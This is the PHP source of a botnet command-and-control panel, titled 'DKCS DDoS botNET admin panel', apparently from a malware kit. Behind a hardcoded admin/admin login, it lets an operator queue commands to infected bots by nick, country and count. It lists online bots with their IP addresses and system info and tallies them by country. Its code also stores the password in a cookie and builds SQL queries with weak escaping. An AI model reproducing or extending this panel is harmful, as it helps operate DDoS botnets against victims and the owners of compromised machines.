<?
// логин
$user = "admin";
// пароль
$pass = "admin";

$bot_timeout = 1000;
$refresh_rate = 60;

include "options.php";
global $mysql;

$luser = @$_POST['user'];
$lpass = @$_POST['pass'];
$login = @$_POST['login'];

$ip = getenv("REMOTE_ADDR");
$refer = $_SERVER["SCRIPT_NAME"]; 

if ($login) {
    Sleep(1);
    if ($luser == $user && $lpass == $pass)
    {
        setcookie("logined", $pass);
    } else {
        die("<font color=#DF0000>Login error</font>");
    }
} else {
    $logined = @$_COOKIE['logined'];
    if ($logined != $pass)
    {
?>
 <html>
 <title>Login</title>
 <head><LINK href=style.css type=text/css rel=StyleSheet></head>
 <body>
 <center>
 <img src="images/logo.jpg">
 <h1>DKCS DDoS botNET admin panel:</h1>
 <hr>
 <form action=<?=$refer?> method=POST>
 <table width="300" border="0">
  <tr>
    <td>Login:</td>
    <td><input type=text name=user></td>
  </tr>
  <tr>
    <td>Password:</td>
    <td><input type=password name=pass></td>
  </tr>
  <tr>
    <td>&nbsp;</td>
    <td><input type=submit name=login value=login></td>
  </tr>
 </table>
 </form>
 <hr>
 <h3>by: Dr.Pixel [icq: 7600278]</h3>
 <hr>
 You IP (<b><? print"$ip"; ?></b>) was logged!
 </body>
 </html>
<?
        exit;
    }
}

// _____________________________________________________________________________
// Connect to MySQL server

    if (@!mysql_connect($mysql['host'], $mysql['user'], $mysql['pass']))
         die("Ops! Cant connect to MySQL server.");

    if (@!mysql_select_db($mysql['dbname']))
         die("mysql_select_db() error.");

    $update      = addslashes($_POST['update']);
    $command     = addslashes($_POST['command']);
    $nick        = addslashes($_POST['nick']);
    $bnum        = intval($_POST['bnum']);
    $cntry       = addslashes((@$_POST['cntry']?$_POST['cntry']:$_GET['cntry']));
    $deltask     = addslashes($_GET['deltask']);

    if ($update)
    {
         if (!$nick) $nick = "mass";
         $r = mysql_query("select * from tasks where nick='$nick' and country='$cntry'");
         if (mysql_num_rows($r))
           mysql_query("update tasks set command='$command', bnum='$bnum', executed='0' where nick='$nick' and country='$cntry'");
         else
           mysql_query("insert into tasks values ('$nick', '$command', '$bnum', '0', '$cntry')");
    }
    if ($deltask)
    {
        mysql_query("delete from tasks where nick='$deltask' and country='$cntry'");
    }
    $r = mysql_query("select * from tasks where nick='mass'");
    if (mysql_num_rows($r)>0)
    {
          $command = mysql_result($r, 0, 1);
    }
    $r = mysql_query("select distinct country from stat");

        $ccode = array(
        "", "AP", "EU", "AD", "AE", "AF", "AG", "AI", "AL", "AM", "AN", "AO", "AQ",
        "AR", "AS", "AT", "AU", "AW", "AZ", "BA", "BB", "BD", "BE", "BF", "BG", "BH",
        "BI", "BJ", "BM", "BN", "BO", "BR", "BS", "BT", "BV", "BW", "BY", "BZ", "CA",
        "CC", "CD", "CF", "CG", "CH", "CI", "CK", "CL", "CM", "CN", "CO", "CR", "CU",
        "CV", "CX", "CY", "CZ", "DE", "DJ", "DK", "DM", "DO", "DZ", "EC", "EE", "EG",
        "EH", "ER", "ES", "ET", "FI", "FJ", "FK", "FM", "FO", "FR", "FX", "GA", "GB",
        "GD", "GE", "GF", "GH", "GI", "GL", "GM", "GN", "GP", "GQ", "GR", "GS", "GT",
        "GU", "GW", "GY", "HK", "HM", "HN", "HR", "HT", "HU", "ID", "IE", "IL", "IN",
        "IO", "IQ", "IR", "IS", "IT", "JM", "JO", "JP", "KE", "KG", "KH", "KI", "KM",
        "KN", "KP", "KR", "KW", "KY", "KZ", "LA", "LB", "LC", "LI", "LK", "LR", "LS",
        "LT", "LU", "LV", "LY", "MA", "MC", "MD", "MG", "MH", "MK", "ML", "MM", "MN",
        "MO", "MP", "MQ", "MR", "MS", "MT", "MU", "MV", "MW", "MX", "MY", "MZ", "NA",
        "NC", "NE", "NF", "NG", "NI", "NL", "NO", "NP", "NR", "NU", "NZ", "OM", "PA",
        "PE", "PF", "PG", "PH", "PK", "PL", "PM", "PN", "PR", "PS", "PT", "PW", "PY",
        "QA", "RE", "RO", "RU", "RW", "SA", "SB", "SC", "SD", "SE", "SG", "SH", "SI",
        "SJ", "SK", "SL", "SM", "SN", "SO", "SR", "ST", "SV", "SY", "SZ", "TC", "TD",
        "TF", "TG", "TH", "TJ", "TK", "TM", "TN", "TO", "TP", "TR", "TT", "TV", "TW",
        "TZ", "UA", "UG", "UM", "US", "UY", "UZ", "VA", "VC", "VE", "VG", "VI", "VN",
        "VU", "WF", "WS", "YE", "YT", "CS", "ZA", "ZM", "ZR", "ZW", "A1", "A2", "O1"
        );

$cname = array(
"", "Asia/Pacific Region", "Europe", "Andorra", "United Arab Emirates",
"Afghanistan", "Antigua and Barbuda", "Anguilla", "Albania", "Armenia",
"Netherlands Antilles", "Angola", "Antarctica", "Argentina", "American Samoa",
"Austria", "Australia", "Aruba", "Azerbaijan", "Bosnia and Herzegovina",
"Barbados", "Bangladesh", "Belgium", "Burkina Faso", "Bulgaria", "Bahrain",
"Burundi", "Benin", "Bermuda", "Brunei Darussalam", "Bolivia", "Brazil",
"Bahamas", "Bhutan", "Bouvet Island", "Botswana", "Belarus", "Belize",
"Canada", "Cocos (Keeling) Islands", "Congo, The Democratic Republic of the",
"Central African Republic", "Congo", "Switzerland", "Cote D'Ivoire", "Cook Islands",
"Chile", "Cameroon", "China", "Colombia", "Costa Rica", "Cuba", "Cape Verde",
"Christmas Island", "Cyprus", "Czech Republic", "Germany", "Djibouti",
"Denmark", "Dominica", "Dominican Republic", "Algeria", "Ecuador", "Estonia",
"Egypt", "Western Sahara", "Eritrea", "Spain", "Ethiopia", "Finland", "Fiji",
"Falkland Islands (Malvinas)", "Micronesia, Federated States of", "Faroe Islands",
"France", "France, Metropolitan", "Gabon", "United Kingdom",
"Grenada", "Georgia", "French Guiana", "Ghana", "Gibraltar", "Greenland",
"Gambia", "Guinea", "Guadeloupe", "Equatorial Guinea", "Greece",
"South Georgia and the South Sandwich Islands", "Guatemala", "Guam", "Guinea-Bissau",
"Guyana", "Hong Kong", "Heard Island and McDonald Islands", "Honduras",
"Croatia", "Haiti", "Hungary", "Indonesia", "Ireland", "Israel", "India",
"British Indian Ocean Territory", "Iraq", "Iran, Islamic Republic of",
"Iceland", "Italy", "Jamaica", "Jordan", "Japan", "Kenya", "Kyrgyzstan",
"Cambodia", "Kiribati", "Comoros", "Saint Kitts and Nevis", "Korea, Democratic People's Republic of",
"Korea, Republic of", "Kuwait", "Cayman Islands",
"Kazakstan", "Lao People's Democratic Republic", "Lebanon", "Saint Lucia",
"Liechtenstein", "Sri Lanka", "Liberia", "Lesotho", "Lithuania", "Luxembourg",
"Latvia", "Libyan Arab Jamahiriya", "Morocco", "Monaco", "Moldova, Republic of",
"Madagascar", "Marshall Islands", "Macedonia", "Mali", "Myanmar", "Mongolia", "Macau", "Northern Mariana Islands",
"Martinique", "Mauritania", "Montserrat", "Malta", "Mauritius", "Maldives",
"Malawi", "Mexico", "Malaysia", "Mozambique", "Namibia", "New Caledonia",
"Niger", "Norfolk Island", "Nigeria", "Nicaragua", "Netherlands", "Norway",
"Nepal", "Nauru", "Niue", "New Zealand", "Oman", "Panama", "Peru", "French Polynesia",
"Papua New Guinea", "Philippines", "Pakistan", "Poland", "Saint Pierre and Miquelon",
"Pitcairn Islands", "Puerto Rico", "Palestinian Territory",
"Portugal", "Palau", "Paraguay", "Qatar", "Reunion", "Romania",
"Russian Federation", "Rwanda", "Saudi Arabia", "Solomon Islands",
"Seychelles", "Sudan", "Sweden", "Singapore", "Saint Helena", "Slovenia",
"Svalbard and Jan Mayen", "Slovakia", "Sierra Leone", "San Marino", "Senegal",
"Somalia", "Suriname", "Sao Tome and Principe", "El Salvador", "Syrian Arab Republic",
"Swaziland", "Turks and Caicos Islands", "Chad", "French Southern Territories",
"Togo", "Thailand", "Tajikistan", "Tokelau", "Turkmenistan",
"Tunisia", "Tonga", "East Timor", "Turkey", "Trinidad and Tobago", "Tuvalu",
"Taiwan", "Tanzania, United Republic of", "Ukraine",
"Uganda", "United States Minor Outlying Islands", "United States", "Uruguay",
"Uzbekistan", "Holy See (Vatican City State)", "Saint Vincent and the Grenadines",
"Venezuela", "Virgin Islands, British", "Virgin Islands, U.S.",
"Vietnam", "Vanuatu", "Wallis and Futuna", "Samoa", "Yemen", "Mayotte",
"Serbia and Montenegro", "South Africa", "Zambia", "Zaire", "Zimbabwe",
"Anonymous Proxy","Satellite Provider","Other");

    $countries = "<select name=\"cntry\">";
    $countries .= "<option value =\"all\" selected>For ALL</option>\n";
    for($ii = 1; $ii < 247; $ii++){
      $countries .= "<option value=\"$ccode[$ii]\">$cname[$ii]</option>\n";
    }
    $countries .= "</select>";
?>

 <html>
 <head>
 <META HTTP-EQUIV="Refresh" CONTENT="<?=$refresh_rate?>; URL=<?=$refer?>">
 <LINK href=style.css type=text/css rel=StyleSheet>
 </head>
 <body>
 <center>
 <h1>DKCS DDoS botNET admin panel:</h1>
 <h3>by: Dr.Pixel [icq: 7600278; email: dkcs@void.ru; web: dkcs.void.ru]</h3>
 <hr>
 <form method=POST> 
 <b>Enter command:</b><br><br>
 Command [<a href="help.php" target="_blank">?</a>]: <input type=text name=command>
 Nick: <input type=text name=nick>
 Execute on <input type=text name=bnum value=0 size=4> bots (0 - all)<br><br>
 On country: <?=$countries;?>
 <input type=submit name=update value="Set new command!">
 </form>
 <form method=POST action=command.php>
 <input type=submit name=com_face value="COMMAND HELP AND FRIENDLY INTERFACE (for beginners)">
 </form>
 <hr>
 <b>All commands:</b><br><br>
 <table width=75% bgcolor=#999999>
 <tr bgcolor=#999999 background=images/bg.gif>
 <td align=center><font color=#000000>Nick</font></td>
 <td align=center><font color=#bbbbbb>Command</font></td>
 <td align=center><font color=#bbbbbb>Executions</font></td>
 <td align=center><font color=#bbbbbb>Country</font></td>
 <td align=center><font color=#bbbbbb>Allready executed</font></td>
 <td align=center><font color=#bbbbbb>Delete</font></td></tr>

<?
    $r = mysql_query("select * from tasks");
    $rows = mysql_num_rows($r);
    for ($i=0; $i<$rows; $i++)
    {
         $f = mysql_fetch_array($r);
         if ($f['bnum'] == 0) $f['bnum'] = "--";
         if (empty($f['country'])) $f['country'] = "--";
         if ($f['bnum'] == $f['executed']) $f['executed'] .= " <small>(done)</small>";
         echo "<tr bgcolor=#CCCCCC>"
             ."<td align=center><b>".$f['nick']."</td>"
             ."<td align=center><input size=100% type=text value=\"".$f['command']."\"></td>"
             ."<td align=center><b>".$f['bnum']."</td>"
             ."<td align=center><b>".($f['country']!=="all"?$cname[array_search($f['country'], $ccode)]:"all")."</td>"
             ."<td align=center><b>".$f['executed']."</td>"
             ."<td align=center><b>"
             ."[<a href='$refer?deltask=".$f['nick']."&amp;cntry=".$f['country']."'>X</a>]</td></tr>";
    }
?>

 </table><hr><b>Bot's online:</b><br><br>
 <table width=75% bgcolor=#999999>
 <tr bgcolor=#999999 background=images/bg.gif>
 <td><center><b>Nick</td>
 <td><center><b>IP adress</td>
 <td><center><b>Last access time</td>
 <td><center><b>Last command</td>
 <td><center><b>Country</td>
 <td><center><b>Info</td></tr>

<?
    $r = mysql_query("select * from stat order by nick");
    $st = mysql_query("select country, count(nick) from stat group by country");
    $rows = mysql_num_rows($r);
    for ($i=0; $i<$rows; $i++)
    {
         $in = $rows - $i - 1;
         $f = mysql_fetch_array($r);
         $last = time() - intval(mysql_result($r, $in, 2));
         if ($last > $bot_timeout)
         {
              mysql_query("delete from stat where nick='".mysql_result($r, $in, 0)."'");
              mysql_query("delete from tasks where nick='".mysql_result($r, $in, 0)."'");
              continue;
         }
         $n = mysql_result($r, $in, 0);
         $info = mysql_result($r, $in, 4);
         $info = str_replace(";", "\\n", $info);
         $info = str_replace("_", " ", $info);
         $info = str_replace("@", "\\n", $info);
         echo "<tr bgcolor=#CCCCCC><td>"
             ."<a href=\"javascript:document.post.nick.value = '$n';document.post.command.focus();\">$n</a></td>"
             ."<td><center>".mysql_result($r, $in, 1)."</td>"
             ."<td><center>".$last." seconds ago"
             ."<td><center><input size=50 type=text value=\"".mysql_result($r, $in, 3)."\"></td>"
             ."<td><center>".$cname[array_search(mysql_result($r, $in, 5), $ccode)]."</td>"
             ."<td><center><a href=\"javascript:alert('$info');\">show info</a></td></tr>";
    }
    echo "</table><hr>";
    while (list($cntry, $cnt) = mysql_fetch_array($st))
      echo $cnt." bots from '<b>".$cname[array_search($cntry, $ccode)]."</b>'<br />";
    echo "<b>Total bots online: </b>$rows<br><hr>";
?>

</body>
</html>